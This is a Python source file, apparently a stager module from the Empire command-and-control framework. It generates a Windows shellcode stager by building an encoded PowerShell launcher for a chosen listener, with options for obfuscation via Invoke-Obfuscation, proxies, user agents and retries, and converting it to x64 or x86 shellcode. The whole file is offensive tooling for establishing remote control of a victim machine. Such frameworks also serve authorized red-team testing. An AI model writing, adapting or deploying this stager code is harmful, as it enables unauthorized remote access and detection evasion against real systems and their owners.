from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Shellcode Launcher',

            'Author': ['@xorrior', '@monogas'],

            'Description': 'Generate a windows shellcode stager',

            'Comments': ['']
        }

        self.options = {
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': '',
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'Arch': {
                'Description': 'Architecture of the .dll to generate (x64 or x86).',
                'Required': True,
                'Value': 'x64',
                'SuggestedValues': ['x64', 'x86'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': True,
                'Value': 'launcher.bin'
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        listener_name = self.options['Listener']['Value']
        arch = self.options['Arch']['Value']

        # staging options
        language = self.options['Language']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""
        else:

            if obfuscate.lower() == "true":
                obfuscate_script = True
            else:
                obfuscate_script = False

            if obfuscate.lower() == "true" and "launcher" in obfuscate_command.lower():
                print(helpers.color("[!] if using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."))
                return ""

            # generate the PowerShell one-liner with all of the proper options are set
            launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=True,
                                                               obfuscate=obfuscate_script,
                                                               obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent,
                                                               proxy=proxy, proxyCreds=proxy_creds,
                                                               stagerRetries=stager_retries)

            if launcher == "":
                print(helpers.color("[!] Error in launcher generation."))
                return ""
            else:
                launcher_code = launcher.split(" ")[-1]
                shellcode = self.mainMenu.stagers.generate_shellcode(launcher_code, arch)
                return shellcode
